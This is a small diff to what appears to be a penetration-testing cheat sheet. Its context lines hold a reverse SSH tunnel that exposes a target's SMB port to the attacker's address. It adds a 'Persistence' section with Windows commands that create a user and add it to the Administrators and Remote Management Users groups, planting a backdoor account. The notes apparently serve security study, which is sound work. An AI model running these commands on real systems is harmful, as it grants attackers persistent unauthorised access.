@@ -115,7 +115,12 @@ ____
      [from target box to expose SMB ]
      ssh -l kali -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
  ____
-  
+ # Persistence
+     net user USERNAME PASSWORD /add
+     net localgroup Administrators USERNAME /add
+     net localgroup "Remote Management Users" USERNAME /add
+ ____
+ 
 # Resources
 ## Cheat Sheets and Guides 
 https://burmat.gitbook.io/security/hacking/one-liners-and-dirty-scripts 
